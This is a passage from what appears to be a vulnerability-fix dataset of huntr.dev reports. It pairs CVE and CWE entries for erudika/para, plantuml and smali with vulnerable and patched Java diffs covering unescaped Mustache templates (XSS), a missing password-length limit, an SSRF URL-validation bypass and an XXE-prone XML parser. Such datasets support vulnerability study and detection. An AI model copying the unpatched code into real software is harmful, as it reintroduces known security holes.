 public Response sendPasswordReset(@Valid @ApiParam(required = true) PasswordResetRequest req) {
  User user = userDAO.findByEmail(req.getEmail());
  if (user == null) {
   return Response.status(Status.PRECONDITION_FAILED).entity(""Email not found."").type(MediaType.TEXT_PLAIN).build();
   return Response.ok().build();
  }

  try {
   user.setRecoverPasswordToken(DigestUtils.sha1Hex(UUID.randomUUID().toString()));
   user.setRecoverPasswordTokenDate(new Date());"
https://huntr.dev/bounties/8dfe0877-e44b-4a1a-8eee-5c03c93ae90a/,Business Logic error lead to race condition in erudika/para,I have found Business logic Bug in para application free User can create more than 1 app even after App limit reached,CVE-2022-1848,CWE-840: Business Logic Errors,https://www.github.com/erudika/para/commit/fa677c629842df60099daa9c23bd802bc41b48d1,"@@ -32,7 +32,6 @@
import java.util.HashMap;
import java.util.List;
import java.util.Objects;
import javax.validation.constraints.Max;
import javax.validation.constraints.NotBlank;
import org.apache.commons.lang3.StringUtils;
import org.slf4j.Logger;
@@ -80,7 +79,7 @@ public class User implements ParaObject {
 @Stored private String idpAccessToken;
 @Stored private String idpRefreshToken;

 private transient @Max(MAX_PASSWORD_LENGTH) String password;

 /**
  * No-args constructor.

@@ -60,6 +60,7 @@
import javax.validation.constraints.Pattern;
import javax.validation.constraints.Size;
import org.apache.commons.beanutils.PropertyUtils;

import org.apache.commons.lang3.math.NumberUtils;
import org.hibernate.validator.constraints.URL;
import org.slf4j.Logger;
@@ -125,6 +126,9 @@ public static String[] validateObject(ParaObject content) {
    String prop = ""'"".concat(constraintViolation.getPropertyPath().toString()).concat(""'"");
    list.add(prop.concat("" "").concat(constraintViolation.getMessage()));
   }



  } catch (Exception e) {
   logger.error(null, e);
  }

@@ -17,13 +17,12 @@
 */
package com.erudika.para.core.utils;

import com.erudika.para.core.utils.Config;
import com.erudika.para.core.App;
import com.erudika.para.core.Sysprop;
import com.erudika.para.core.Tag;
import com.erudika.para.core.User;
import static com.erudika.para.core.validation.ValidationUtils.*;
import static com.erudika.para.core.validation.Constraint.*;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
@@ -228,6 +227,68 @@ public void testValidateObject() {
  assertTrue(validateObject(app, s1).length == 0);
 }































































 @Test
 public void testGetCoreValidationConstraints() {
  assertTrue(getCoreValidationConstraints().containsKey(""app""));

","3
para-core/src/main/java/com/erudika/para/core/User.java
@@ -32,7 +32,6 @@
import java.util.HashMap;
import java.util.List;
import java.util.Objects;
import javax.validation.constraints.Max;
import javax.validation.constraints.NotBlank;
import org.apache.commons.lang3.StringUtils;
import org.slf4j.Logger;
@@ -80,7 +79,7 @@ public class User implements ParaObject {
 @Stored private String idpAccessToken;
 @Stored private String idpRefreshToken;

 private transient @Max(MAX_PASSWORD_LENGTH) String password;
 private transient String password;

 /**
  * No-args constructor.
4
para-core/src/main/java/com/erudika/para/core/validation/ValidationUtils.java
@@ -60,6 +60,7 @@
import javax.validation.constraints.Pattern;
import javax.validation.constraints.Size;
import org.apache.commons.beanutils.PropertyUtils;
import org.apache.commons.lang3.StringUtils;
import org.apache.commons.lang3.math.NumberUtils;
import org.hibernate.validator.constraints.URL;
import org.slf4j.Logger;
@@ -125,6 +126,9 @@ public static String[] validateObject(ParaObject content) {
    String prop = ""'"".concat(constraintViolation.getPropertyPath().toString()).concat(""'"");
    list.add(prop.concat("" "").concat(constraintViolation.getMessage()));
   }
   if (content instanceof User && StringUtils.length(((User) content).getPassword()) > User.MAX_PASSWORD_LENGTH) {
    list.add(Utils.formatMessage(""{0} must not be longer than {1}."", Config._PASSWORD, User.MAX_PASSWORD_LENGTH));
   }
  } catch (Exception e) {
   logger.error(null, e);
  }
65
para-server/src/test/java/com/erudika/para/core/utils/ValidationUtilsTest.java
@@ -17,13 +17,12 @@
 */
package com.erudika.para.core.utils;

import com.erudika.para.core.utils.Config;
import com.erudika.para.core.App;
import com.erudika.para.core.Sysprop;
import com.erudika.para.core.Tag;
import com.erudika.para.core.User;
import static com.erudika.para.core.validation.ValidationUtils.*;
import static com.erudika.para.core.validation.Constraint.*;
import static com.erudika.para.core.validation.ValidationUtils.*;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
@@ -228,6 +227,68 @@ public void testValidateObject() {
  assertTrue(validateObject(app, s1).length == 0);
 }

 @Test
 public void testPasswordConstraint() {
  User u = new User();
  u.setName(""test"");
  u.setEmail(""ab@cd.com"");
  u.setIdentifier(""ab@cd.com"");
  assertTrue(validateObject(u).length == 0);
  u.setPassword(""T123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456""
    + ""78912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345670""
    + ""89123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789""
    + ""12345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912""
    + ""34567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234""
    + ""56789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456""
    + ""78912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678""
    + ""91234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891""
    + ""23456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123""
    + ""45678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345""
    + ""67891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567""
    + ""89123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789""
    + ""12345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912""
    + ""34567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234""
    + ""56789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456""
    + ""78912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678""
    + ""91234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891""
    + ""23456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123""
    + ""45678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345""
    + ""67891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567""
    + ""89123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789""
    + ""12345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912""
    + ""34567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234""
    + ""56789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456""
    + ""78912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678""
    + ""91234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891""
    + ""23456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123""
    + ""45678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345""
    + ""67891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567""
    + ""89123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789""
    + ""12345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912""
    + ""34567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234""
    + ""56789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456""
    + ""78912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678""
    + ""91234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891""
    + ""23456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123""
    + ""45678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345""
    + ""67891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567""
    + ""89123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789""
    + ""12345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912""
    + ""34567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234""
    + ""56789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456""
    + ""78912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678""
    + ""91234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891""
    + ""23456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123""
    + ""45678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345""
    + ""67891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567""
    + ""89123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789""
    + ""12345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912""
    + ""34567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234""
    + ""56789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456""
    + ""789hellohellohellohello"");
  assertFalse(validateObject(u).length == 0);
 }

 @Test
 public void testGetCoreValidationConstraints() {
  assertTrue(getCoreValidationConstraints().containsKey(""app""));"
https://huntr.dev/bounties/7197f8ed-d6d2-43ab-9adf-2eb2cdf94445/,Application Level DoS: in erudika/para,"Hey, when I attempt to change the password, I noticed that you haven't kept any password boundary. You need to limit password length. Hashing a large amount of data can cause significant resource consumption on behalf of the server and would be an easy target for an Application-level Denial Of Service attack.",,CWE-303: Incorrect Implementation of Authentication Algorithm,https://www.github.com/erudika/para/commit/735f69642c3b3d7231ea59fda2d2ccedfd4173cd,"@@ -32,6 +32,7 @@
import java.util.HashMap;
import java.util.List;
import java.util.Objects;

import javax.validation.constraints.NotBlank;
import org.apache.commons.lang3.StringUtils;
import org.slf4j.Logger;
@@ -45,6 +46,11 @@ public class User implements ParaObject {
 private static final long serialVersionUID = 1L;
 private static Logger logger = LoggerFactory.getLogger(User.class);






 @Stored @Locked private String id;
 @Stored @Locked private Long timestamp;
 @Stored @Locked private String type;
@@ -74,7 +80,7 @@ public class User implements ParaObject {
 @Stored private String idpAccessToken;
 @Stored private String idpRefreshToken;

 private transient String password;

 /**
  * No-args constructor.

@@ -17,12 +17,13 @@
 */
package com.erudika.para.core.validation;

import com.erudika.para.core.annotations.Email;
import com.erudika.para.core.App;
import com.erudika.para.core.ParaObject;
import com.erudika.para.core.utils.ParaObjectUtils;
import com.erudika.para.core.Sysprop;


import com.erudika.para.core.utils.Config;

import com.erudika.para.core.utils.Utils;
import static com.erudika.para.core.validation.Constraint.digits;
import static com.erudika.para.core.validation.Constraint.email;
@@ -260,6 +261,8 @@ private static boolean isValidSimpleConstraint(String cName, String field, Objec
     }
    }
   }


  }
  return Collections.unmodifiableMap(CORE_CONSTRAINTS);
 }

","8
para-core/src/main/java/com/erudika/para/core/User.java
@@ -32,6 +32,7 @@
import java.util.HashMap;
import java.util.List;
import java.util.Objects;
import javax.validation.constraints.Max;
import javax.validation.constraints.NotBlank;
import org.apache.commons.lang3.StringUtils;
import org.slf4j.Logger;
@@ -45,6 +46,11 @@ public class User implements ParaObject {
 private static final long serialVersionUID = 1L;
 private static Logger logger = LoggerFactory.getLogger(User.class);

 /**
  * Maximum password length.
  */
 public static final int MAX_PASSWORD_LENGTH = 500;

 @Stored @Locked private String id;
 @Stored @Locked private Long timestamp;
 @Stored @Locked private String type;
@@ -74,7 +80,7 @@ public class User implements ParaObject {
 @Stored private String idpAccessToken;
 @Stored private String idpRefreshToken;

 private transient String password;
 private transient @Max(MAX_PASSWORD_LENGTH) String password;

 /**
  * No-args constructor.
7
para-core/src/main/java/com/erudika/para/core/validation/ValidationUtils.java
@@ -17,12 +17,13 @@
 */
package com.erudika.para.core.validation;

import com.erudika.para.core.annotations.Email;
import com.erudika.para.core.App;
import com.erudika.para.core.ParaObject;
import com.erudika.para.core.utils.ParaObjectUtils;
import com.erudika.para.core.Sysprop;
import com.erudika.para.core.User;
import com.erudika.para.core.annotations.Email;
import com.erudika.para.core.utils.Config;
import com.erudika.para.core.utils.ParaObjectUtils;
import com.erudika.para.core.utils.Utils;
import static com.erudika.para.core.validation.Constraint.digits;
import static com.erudika.para.core.validation.Constraint.email;
@@ -260,6 +261,8 @@ private static boolean isValidSimpleConstraint(String cName, String field, Objec
     }
    }
   }
   CORE_CONSTRAINTS.get(Utils.type(User.class)).put(""password"",
     Collections.singletonMap(""max"", Constraint.max(User.MAX_PASSWORD_LENGTH).getPayload()));
  }
  return Collections.unmodifiableMap(CORE_CONSTRAINTS);
 }"
https://huntr.dev/bounties/7555693f-94e4-4183-98cb-3497da6df028/,Html Injection lead to cross site scripting in erudika/para,Hi i Found a way to inject html in user's email. So in this case if a attacker set name of victim as html form it will be rendered by your system and then the render html will be sent to the victim,CVE-2022-1782,CWE-79: Cross-site Scripting (XSS) - Generic,https://www.github.com/erudika/para/commit/9d844f31333475a0394dd14b901ea50674b281f8,"@@ -330,13 +330,13 @@ public static String markdownToHtml(String markdownString, boolean htmlTagsRende
  * @param template a Mustache template
  * @return the compiled template string
  */
 public static String compileMustache(Map<String, Object> context, String template) {
  if (context == null || StringUtils.isBlank(template)) {
   return """";
  }
  Writer writer = new StringWriter();
  try {
   Mustache.compiler().escapeHTML(false).emptyStringIsFalse(true).compile(template).execute(context, writer);
  } finally {
   try {
    writer.close();
@@ -347,6 +347,16 @@ public static String compileMustache(Map<String, Object> context, String templat
  return writer.toString();
 }











 /**
  * Abbreviates a string.
  * @param str a string

@@ -17,17 +17,15 @@
 */
package com.erudika.para.core.utils;

import com.erudika.para.core.utils.Config;
import com.erudika.para.core.utils.Utils;
import com.erudika.para.core.annotations.Locked;
import com.erudika.para.core.App;
import com.erudika.para.core.ParaObject;
import com.erudika.para.core.Sysprop;
import com.erudika.para.core.Tag;
import com.erudika.para.core.User;
import com.erudika.para.core.Votable;
import static com.erudika.para.core.utils.Utils.*;
import static com.erudika.para.core.utils.ParaObjectUtils.*;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
@@ -114,6 +112,8 @@ public void testCompileMustache() {
  Map<String, Object> map = new HashMap<>();
  map.put(""test"", ""string"");
  assertEquals(""<html>string</html>"", compileMustache(map, ""<html>{{test}}</html>""));


 }

 @Test

","14
para-core/src/main/java/com/erudika/para/core/utils/Utils.java
@@ -330,13 +330,13 @@ public static String markdownToHtml(String markdownString, boolean htmlTagsRende
  * @param template a Mustache template
  * @return the compiled template string
  */
 public static String compileMustache(Map<String, Object> context, String template) {
 public static String compileMustache(Map<String, Object> context, String template, boolean escapeHtml) {
  if (context == null || StringUtils.isBlank(template)) {
   return """";
  }
  Writer writer = new StringWriter();
  try {
   Mustache.compiler().escapeHTML(false).emptyStringIsFalse(true).compile(template).execute(context, writer);
   Mustache.compiler().escapeHTML(escapeHtml).emptyStringIsFalse(true).compile(template).execute(context, writer);
  } finally {
   try {
    writer.close();
@@ -347,6 +347,16 @@ public static String compileMustache(Map<String, Object> context, String templat
  return writer.toString();
 }

 /**
  * @see #compileMustache(java.util.Map, java.lang.String, boolean)
  * @param context a map of fields and values
  * @param template a Mustache template
  * @return the compiled template string
  */
 public static String compileMustache(Map<String, Object> context, String template) {
  return compileMustache(context, template, false);
 }

 /**
  * Abbreviates a string.
  * @param str a string
8
para-server/src/test/java/com/erudika/para/core/utils/UtilsTest.java
@@ -17,17 +17,15 @@
 */
package com.erudika.para.core.utils;

import com.erudika.para.core.utils.Config;
import com.erudika.para.core.utils.Utils;
import com.erudika.para.core.annotations.Locked;
import com.erudika.para.core.App;
import com.erudika.para.core.ParaObject;
import com.erudika.para.core.Sysprop;
import com.erudika.para.core.Tag;
import com.erudika.para.core.User;
import com.erudika.para.core.Votable;
import static com.erudika.para.core.utils.Utils.*;
import com.erudika.para.core.annotations.Locked;
import static com.erudika.para.core.utils.ParaObjectUtils.*;
import static com.erudika.para.core.utils.Utils.*;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
@@ -114,6 +112,8 @@ public void testCompileMustache() {
  Map<String, Object> map = new HashMap<>();
  map.put(""test"", ""string"");
  assertEquals(""<html>string</html>"", compileMustache(map, ""<html>{{test}}</html>""));
  map.put(""test"", ""<b>string</b>"");
  assertEquals(""<html>&lt;b&gt;string&lt;/b&gt;</html>"", compileMustache(map, ""<html>{{test}}</html>"", true));
 }

 @Test"
https://huntr.dev/bounties/0d737527-86e1-41d1-9d37-b2de36bc063a/,URL Restriction Bypass in plantuml/plantuml,The validation of URLs contains flaws that allow bypassing security restrictions that are applied in the security profiles of PlantUML. There are two different flaws through which validation mechanisms can be circumvented.,CVE-2022-1379,CWE-918: Server-Side Request Forgery (SSRF),https://www.github.com/plantuml/plantuml/commit/93e5964e5f35914f3f7b89de620c596795550083,"@@ -20,7 +20,7 @@
 <target name=""compile"">
  <delete dir=""build"" />
  <mkdir dir=""build"" />
  <javac target=""1.7"" source=""1.7"" srcdir=""src"" destdir=""build"" debug=""on"" />
  <copy file=""src/net/sourceforge/plantuml/version/logo.png""
   todir=""build/net/sourceforge/plantuml/version"" />
  <copy file=""src/net/sourceforge/plantuml/version/favicon.png""

@@ -423,7 +423,7 @@ timingDiagram {
   FontSize 12
   LineColor darkgreen
   BackgroundColor: var(--grey-blue);
      LineThickness 2
 }
 robust {
   FontStyle plain

@@ -136,6 +136,14 @@ group {
    BackGroundColor transparent
}









sequenceDiagram {
  group {
    LineColor black
@@ -494,6 +502,7 @@ timingDiagram {
   FontSize 12
   LineColor darkgreen
   BackgroundColor #c

 }
 robust {
   FontStyle plain

@@ -217,7 +217,7 @@ List<String> cleanForKey(String key) {

 List<String> cleanForKeySlow(String key) {
  key = StringUtils.trin(StringUtils.goLowerCase(key));
  key = key.replaceAll(""_|\\.|\\s"", """");
  // key = replaceSmart(key, ""partition"", ""package"");
  key = replaceSmart(key, ""sequenceparticipant"", ""participant"");
  key = replaceSmart(key, ""sequenceactor"", ""actor"");

@@ -258,7 +258,7 @@ private void drawSingleCluster(UGraphic ug, IGroup group, ElkNode elkNode) {
   final Style style = Cluster.getDefaultStyleDefinition(umlDiagramType.getStyleName(), group.getUSymbol())
     .getMergedStyle(skinParam.getCurrentStyleBuilder());
   final double shadowing = style.value(PName.Shadowing).asDouble();
   final UStroke stroke = Cluster.getStrokeInternal(group, skinParam, style);

   HColor backColor = getBackColor(umlDiagramType);
   backColor = Cluster.getBackColor(backColor, skinParam, group.getStereotype(), umlDiagramType.getStyleName(),

@@ -110,7 +110,7 @@ public class SURL {
 /**
  * Regex to remove the UserInfo part from a URL.
  */
 private static final Pattern PATTERN_USERINFO = Pattern.compile(""(^https?://)([-_:0-9a-zA-Z]+@)([^@]*)"");

 private static final ExecutorService EXE = Executors.newCachedThreadPool(new ThreadFactory() {
  public Thread newThread(Runnable r) {

@@ -37,7 +37,6 @@

import net.sourceforge.plantuml.SkinParam;
import net.sourceforge.plantuml.TitledDiagram;
import net.sourceforge.plantuml.UseStyle;
import net.sourceforge.plantuml.command.BlocLines;
import net.sourceforge.plantuml.command.CommandExecutionResult;
import net.sourceforge.plantuml.command.CommandMultilines2;

@@ -83,7 +83,7 @@ public Collection<StyleSignatureBasic> toSignatures() {
   final List<StyleSignatureBasic> tmp = new ArrayList<>();
   for (StyleSignatureBasic ss : results)
    for (String name : names)
     tmp.add(ss.add(name));
   results = tmp;
  }


@@ -210,6 +210,14 @@ public String toString() {
  addMagic(SName.usecase);
  addMagic(SName.map);
  addMagic(SName.archimate);









 }

@@ -221,8 +229,14 @@ private static void addMagic(SName sname) {
  addConvert(cleanName + ""RoundCorner"", PName.RoundCorner, sname);
  addConvert(cleanName + ""DiagonalCorner"", PName.DiagonalCorner, sname);
  addConvert(cleanName + ""BorderStyle"", PName.LineStyle, sname);
  addConvert(cleanName + ""StereotypeFontColor"", PName.FontColor, SName.stereotype, sname);
  addConFont(cleanName, sname);







 }

 private final List<Style> styles = new ArrayList<>();
@@ -234,7 +248,7 @@ public FromSkinparamToStyle(String key) {
  if (key.contains(""<<"")) {
   final StringTokenizer st = new StringTokenizer(key, ""<>"");
   this.key = st.nextToken();
   this.stereo = st.hasMoreTokens() ? st.nextToken() : null;
  } else {
   this.key = key;
   this.stereo = null;
@@ -243,6 +257,12 @@ public FromSkinparamToStyle(String key) {
 }

 public void convertNow(String value, final AutomaticCounter counter) {






  if (value.equalsIgnoreCase(""right:right""))
   value = ""right"";
  if (value.equalsIgnoreCase(""dotted""))

@@ -164,7 +164,7 @@ public static Collection<Style> getDeclaredStyles(BlocLines lines, AutomaticCoun

   final Matcher2 mKeyNames = keyName.matcher(trimmed);
   if (mKeyNames.find()) {
    String names = mKeyNames.group(1).replace("" "", """");
    final boolean isRecurse = mKeyNames.group(2) != null;
    if (isRecurse)
     names += ""*"";

@@ -35,9 +35,8 @@
 */
package net.sourceforge.plantuml.svek;

import net.sourceforge.plantuml.awt.geom.Dimension2D;

import net.sourceforge.plantuml.Dimension2DDouble;

import net.sourceforge.plantuml.graphic.AbstractTextBlock;
import net.sourceforge.plantuml.graphic.StringBounder;
import net.sourceforge.plantuml.graphic.SymbolContext;

@@ -35,9 +35,8 @@
 */
package net.sourceforge.plantuml.svek;

import net.sourceforge.plantuml.awt.geom.Dimension2D;

import net.sourceforge.plantuml.Dimension2DDouble;

import net.sourceforge.plantuml.graphic.AbstractTextBlock;
import net.sourceforge.plantuml.graphic.StringBounder;
import net.sourceforge.plantuml.graphic.TextBlock;

","2
build.xml
@@ -20,7 +20,7 @@
 <target name=""compile"">
  <delete dir=""build"" />
  <mkdir dir=""build"" />
  <javac target=""1.7"" source=""1.7"" srcdir=""src"" destdir=""build"" debug=""on"" />
  <javac target=""1.8"" source=""1.8"" srcdir=""src"" destdir=""build"" debug=""on"" />
  <copy file=""src/net/sourceforge/plantuml/version/logo.png""
   todir=""build/net/sourceforge/plantuml/version"" />
  <copy file=""src/net/sourceforge/plantuml/version/favicon.png""
2
skin/plantuml.skin
@@ -423,7 +423,7 @@ timingDiagram {
   FontSize 12
   LineColor darkgreen
   BackgroundColor: var(--grey-blue);
      LineThickness 2
      LineThickness 1.5
 }
 robust {
   FontStyle plain
9
skin/rose.skin
@@ -136,6 +136,14 @@ group {
    BackGroundColor transparent
}

componentDiagram {
  node, rectangle {
    LineColor black
    LineThickness 1.5
  }
}


sequenceDiagram {
  group {
    LineColor black
@@ -494,6 +502,7 @@ timingDiagram {
   FontSize 12
   LineColor darkgreen
   BackgroundColor #c
      LineThickness 1.5
 }
 robust {
   FontStyle plain
2
src/net/sourceforge/plantuml/SkinParam.java
@@ -217,7 +217,7 @@ List<String> cleanForKey(String key) {

 List<String> cleanForKeySlow(String key) {
  key = StringUtils.trin(StringUtils.goLowerCase(key));
  key = key.replaceAll(""_|\\.|\\s"", """");
  key = key.replaceAll(""_|\\."", """");
  // key = replaceSmart(key, ""partition"", ""package"");
  key = replaceSmart(key, ""sequenceparticipant"", ""participant"");
  key = replaceSmart(key, ""sequenceactor"", ""actor"");
2
src/net/sourceforge/plantuml/elk/CucaDiagramFileMakerElk.java
@@ -258,7 +258,7 @@ private void drawSingleCluster(UGraphic ug, IGroup group, ElkNode elkNode) {
   final Style style = Cluster.getDefaultStyleDefinition(umlDiagramType.getStyleName(), group.getUSymbol())
     .getMergedStyle(skinParam.getCurrentStyleBuilder());
   final double shadowing = style.value(PName.Shadowing).asDouble();
   final UStroke stroke = Cluster.getStrokeInternal(group, skinParam, style);
   final UStroke stroke = Cluster.getStrokeInternal(group, style);

   HColor backColor = getBackColor(umlDiagramType);
   backColor = Cluster.getBackColor(backColor, skinParam, group.getStereotype(), umlDiagramType.getStyleName(),
2
src/net/sourceforge/plantuml/security/SURL.java
@@ -110,7 +110,7 @@ public class SURL {
 /**
  * Regex to remove the UserInfo part from a URL.
  */
 private static final Pattern PATTERN_USERINFO = Pattern.compile(""(^https?://)([-_:0-9a-zA-Z]+@)([^@]*)"");
 private static final Pattern PATTERN_USERINFO = Pattern.compile(""(^https?://)([-_0-9a-zA-Z]+@)([^@]*)"");

 private static final ExecutorService EXE = Executors.newCachedThreadPool(new ThreadFactory() {
  public Thread newThread(Runnable r) {
1
src/net/sourceforge/plantuml/style/CommandStyleMultilinesCSS.java
@@ -37,7 +37,6 @@

import net.sourceforge.plantuml.SkinParam;
import net.sourceforge.plantuml.TitledDiagram;
import net.sourceforge.plantuml.UseStyle;
import net.sourceforge.plantuml.command.BlocLines;
import net.sourceforge.plantuml.command.CommandExecutionResult;
import net.sourceforge.plantuml.command.CommandMultilines2;
2
src/net/sourceforge/plantuml/style/Context.java
@@ -83,7 +83,7 @@ public Collection<StyleSignatureBasic> toSignatures() {
   final List<StyleSignatureBasic> tmp = new ArrayList<>();
   for (StyleSignatureBasic ss : results)
    for (String name : names)
     tmp.add(ss.add(name));
     tmp.add(ss.add(name.trim()));
   results = tmp;
  }

24
src/net/sourceforge/plantuml/style/FromSkinparamToStyle.java
@@ -210,6 +210,14 @@ public String toString() {
  addMagic(SName.usecase);
  addMagic(SName.map);
  addMagic(SName.archimate);


//  addConvert(""nodeStereotypeFontSize"", PName.FontSize, SName.node, SName.stereotype);
//  addConvert(""sequenceStereotypeFontSize"", PName.FontSize, SName.stereotype);
//  addConvert(""sequenceStereotypeFontStyle"", PName.FontStyle, SName.stereotype);
//  addConvert(""sequenceStereotypeFontColor"", PName.FontColor, SName.stereotype);
//  addConvert(""sequenceStereotypeFontName"", PName.FontName, SName.stereotype);


 }

@@ -221,8 +229,14 @@ private static void addMagic(SName sname) {
  addConvert(cleanName + ""RoundCorner"", PName.RoundCorner, sname);
  addConvert(cleanName + ""DiagonalCorner"", PName.DiagonalCorner, sname);
  addConvert(cleanName + ""BorderStyle"", PName.LineStyle, sname);
  addConvert(cleanName + ""StereotypeFontColor"", PName.FontColor, SName.stereotype, sname);
  addConFont(cleanName, sname);
  addConvert(cleanName + ""Shadowing"", PName.Shadowing, sname);

  addConvert(cleanName + ""StereotypeFontSize"", PName.FontSize, SName.stereotype, sname);
  addConvert(cleanName + ""StereotypeFontStyle"", PName.FontStyle, SName.stereotype, sname);
  addConvert(cleanName + ""StereotypeFontColor"", PName.FontColor, SName.stereotype, sname);
  addConvert(cleanName + ""StereotypeFontName"", PName.FontName, SName.stereotype, sname);

 }

 private final List<Style> styles = new ArrayList<>();
@@ -234,7 +248,7 @@ public FromSkinparamToStyle(String key) {
  if (key.contains(""<<"")) {
   final StringTokenizer st = new StringTokenizer(key, ""<>"");
   this.key = st.nextToken();
   this.stereo = st.hasMoreTokens() ? st.nextToken() : null;
   this.stereo = st.hasMoreTokens() ? st.nextToken().trim() : null;
  } else {
   this.key = key;
   this.stereo = null;
@@ -243,6 +257,12 @@ public FromSkinparamToStyle(String key) {
 }

 public void convertNow(String value, final AutomaticCounter counter) {
  if (key.endsWith(""shadowing"")) {
   if (value.equalsIgnoreCase(""false""))
    value = ""0"";
   else if (value.equalsIgnoreCase(""true""))
    value = ""3"";
  }
  if (value.equalsIgnoreCase(""right:right""))
   value = ""right"";
  if (value.equalsIgnoreCase(""dotted""))
2
src/net/sourceforge/plantuml/style/StyleLoader.java
@@ -164,7 +164,7 @@ public static Collection<Style> getDeclaredStyles(BlocLines lines, AutomaticCoun

   final Matcher2 mKeyNames = keyName.matcher(trimmed);
   if (mKeyNames.find()) {
    String names = mKeyNames.group(1).replace("" "", """");
    String names = mKeyNames.group(1);
    final boolean isRecurse = mKeyNames.group(2) != null;
    if (isRecurse)
     names += ""*"";
3
src/net/sourceforge/plantuml/svek/Boundary.java
@@ -35,9 +35,8 @@
 */
package net.sourceforge.plantuml.svek;

import net.sourceforge.plantuml.awt.geom.Dimension2D;

import net.sourceforge.plantuml.Dimension2DDouble;
import net.sourceforge.plantuml.awt.geom.Dimension2D;
import net.sourceforge.plantuml.graphic.AbstractTextBlock;
import net.sourceforge.plantuml.graphic.StringBounder;
import net.sourceforge.plantuml.graphic.SymbolContext;
3
src/net/sourceforge/plantuml/svek/CircleInterface2.java
@@ -35,9 +35,8 @@
 */
package net.sourceforge.plantuml.svek;

import net.sourceforge.plantuml.awt.geom.Dimension2D;

import net.sourceforge.plantuml.Dimension2DDouble;
import net.sourceforge.plantuml.awt.geom.Dimension2D;
import net.sourceforge.plantuml.graphic.AbstractTextBlock;
import net.sourceforge.plantuml.graphic.StringBounder;
import net.sourceforge.plantuml.graphic.TextBlock;"
https://huntr.dev/bounties/c68f1aed-2922-4ebb-9699-00e0aea1d662/,Improper Restriction of XML External Entity Reference in jesusfreke/smali,"The loadResourceIds() function makes use of SAXParser generated from a SAXParserFactory with no FEATURE_SECURE_PROCESSING set, allowing for XXE attacks. In https://github.com/JesusFreke/smali/blob/cbd41d36ccde221ccc4ec2aa0c15ca2fa4491a62/baksmali/src/main/java/org/jf/baksmali/BaksmaliOptions.java#L87",,CWE-611: Improper Restriction of XML External Entity Reference,https://www.github.com/jesusfreke/smali/commit/2771eae0a11f07bd892732232e6ee4e32437230d,"@@ -38,6 +38,7 @@
import org.xml.sax.SAXException;
import org.xml.sax.helpers.DefaultHandler;


import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
@@ -84,9 +85,12 @@ public class BaksmaliOptions {
    public void loadResourceIds(Map<String, File> resourceFiles) throws SAXException, IOException {
        for (Map.Entry<String, File> entry: resourceFiles.entrySet()) {
            try {
                SAXParser saxp = SAXParserFactory.newInstance().newSAXParser();



                final String prefix = entry.getKey();
                saxp.parse(entry.getValue(), new DefaultHandler() {
                    @Override
                    public void startElement(String uri, String localName, String qName,
                                             Attributes attr) throws SAXException {

","8
baksmali/src/main/java/org/jf/baksmali/BaksmaliOptions.java
@@ -38,6 +38,7 @@
import org.xml.sax.SAXException;
import org.xml.sax.helpers.DefaultHandler;

import javax.xml.XMLConstants;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
@@ -84,9 +85,12 @@ public class BaksmaliOptions {
    public void loadResourceIds(Map<String, File> resourceFiles) throws SAXException, IOException {
        for (Map.Entry<String, File> entry: resourceFiles.entrySet()) {
            try {
